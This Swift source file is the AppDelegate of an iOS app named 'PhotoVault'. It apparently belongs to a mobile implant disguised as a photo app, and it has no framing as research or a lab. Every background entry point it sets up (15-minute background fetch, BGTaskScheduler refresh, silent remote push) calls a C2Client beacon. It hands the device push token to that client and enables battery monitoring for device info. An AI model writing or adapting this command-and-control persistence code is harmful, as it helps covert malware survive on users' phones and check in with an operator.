import UIKit
import BackgroundTasks
import UserNotifications

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        // Register background refresh task
        BGTaskScheduler.shared.register(forTaskWithIdentifier: "com.photovault.refresh", using: nil) { task in
            self.handleBackgroundRefresh(task: task as! BGAppRefreshTask)
        }
        
        // Register for remote notifications (silent push)
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { granted, _ in
            if granted {
                DispatchQueue.main.async {
                    application.registerForRemoteNotifications()
                }
            }
        }
        
        // Legacy background fetch interval — 15 minutes
        application.setMinimumBackgroundFetchInterval(900)
        
        // Enable battery monitoring for device info
        UIDevice.current.isBatteryMonitoringEnabled = true
        
        return true
    }
    
    // MARK: - Legacy Background Fetch
    func application(_ application: UIApplication, performFetchWithCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        C2Client.shared.beacon { success in
            completionHandler(success ? .newData : .failed)
        }
    }
    
    // MARK: - BGTaskScheduler
    private func handleBackgroundRefresh(task: BGAppRefreshTask) {
        scheduleBackgroundRefresh()
        
        let queue = OperationQueue()
        queue.maxConcurrentOperationCount = 1
        
        task.expirationHandler = {
            queue.cancelAllOperations()
        }
        
        let op = BlockOperation {
            let semaphore = DispatchSemaphore(value: 0)
            C2Client.shared.beacon { _ in
                semaphore.signal()
            }
            semaphore.wait()
        }
        
        op.completionBlock = {
            task.setTaskCompleted(success: !op.isCancelled)
        }
        
        queue.addOperation(op)
    }
    
    func scheduleBackgroundRefresh() {
        let request = BGAppRefreshTaskRequest(identifier: "com.photovault.refresh")
        request.earliestBeginDate = Date(timeIntervalSinceNow: 900)
        do {
            try BGTaskScheduler.shared.submit(request)
        } catch {
            print("[PhotoVault] BG schedule failed: \(error)")
        }
    }
    
    // MARK: - Remote Notifications
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        let token = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        C2Client.shared.pushToken = token
    }
    
    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print("[PhotoVault] Push registration failed: \(error)")
    }
    
    // Silent push handler — wakes the app and beacons
    func application(_ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable: Any], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        C2Client.shared.beacon { success in
            completionHandler(success ? .newData : .failed)
        }
    }
    
    // MARK: - Scene Configuration
    func application(_ application: UIApplication, configurationForConnecting connectingSceneSession: UISceneSession, options: UIScene.ConnectionOptions) -> UISceneConfiguration {
        return UISceneConfiguration(name: "Default Configuration", sessionRole: connectingSceneSession.role)
    }
    
    func application(_ application: UIApplication, didDiscardSceneSessions sceneSessions: Set<UISceneSession>) {}
    
    func applicationDidEnterBackground(_ application: UIApplication) {
        scheduleBackgroundRefresh()
    }
}
